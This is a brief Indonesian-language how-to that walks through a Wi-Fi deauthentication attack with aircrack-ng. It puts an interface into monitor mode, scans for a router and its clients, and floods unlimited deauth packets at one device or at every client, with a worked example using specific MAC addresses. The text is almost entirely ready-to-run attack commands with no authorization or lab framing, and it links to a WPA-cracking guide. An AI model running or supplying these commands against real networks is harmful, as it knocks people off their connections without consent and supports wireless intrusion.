# Memaksa Suatu Device Keluar dari Wifi Menggunakan Deauthentication Attack
## Aplikasi yang Perlu Disiapkan

>sudo apt install aircrack-ng

## Deauth

lihat interface
```bash
iwconfig
airmon-ng start [INTERFACE]
airodump-ng [INTERFACE]mon
airodump-ng [INTERFACE]mon --bssid [routers BSSID here]--channel [routers channel here]
deauth bertarget
aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] [INTERFACE]mon
deauth 1 router
```

```
aireplay-ng --deauth 0 -a [ROUTERS MAC ADDRESS] [INTERFACE]mon
```

## Selesai
```bash
sudo airmon-ng stop [interface]mon
sudo systemctl restart network-manager.service
```


## Contoh
```shell
sudo airmon-ng start wlp2s0
sudo airodump-ng wlp2s0mon
sudo airodump-ng wlp2s0mon --bssid A4:2B:B0:00:73:0A --channel 2
	sudo aireplay-ng --deauth 0 -c CC:46:4E:6E:96:1E -a  A4:2B:B0:00:73:0A wlp2s0mon
sudo aireplay-ng --deauth 0 -a A4:2B:B0:00:73:0A wlp2s0mon
sudo airmon-ng stop wlp2s0mon
```
## Referensi

[https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142](https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142)

[https://www.geeksforgeeks.org/how-to-hack-wpa-wpa2-wifi-using-kali-linux/](https://www.geeksforgeeks.org/how-to-hack-wpa-wpa2-wifi-using-kali-linux/)